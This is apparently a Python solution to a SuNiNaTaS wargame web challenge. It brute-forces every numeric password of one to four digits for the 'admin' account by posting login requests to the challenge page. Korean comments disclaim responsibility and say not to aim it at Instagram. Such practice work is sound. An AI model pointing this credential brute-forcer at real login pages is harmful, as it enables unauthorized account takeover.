import requests
import itertools
ChardTemp = '0123456789'
for PasswordLen in range(1, 5):
    for password in itertools.product(ChardTemp, repeat=PasswordLen):
        pw = ''.join(password)
        print(pw)
        LoginPacket = {
            'id': 'admin',
            'pw': pw,}
        address = requests.post(
            'http://suninatas.com/challenge/web08/web08.asp', data=LoginPacket)
        if address.text.find('Incorrect') == -1: exit()
#이걸로 이상한 지랄하다가 잡히면 난 책임 안짐
#저기 있는 주소로만 하셈. ㅈㅂ 인스타에다가 하지말고 ㅇㅇ 어차피 작동 안할듯?
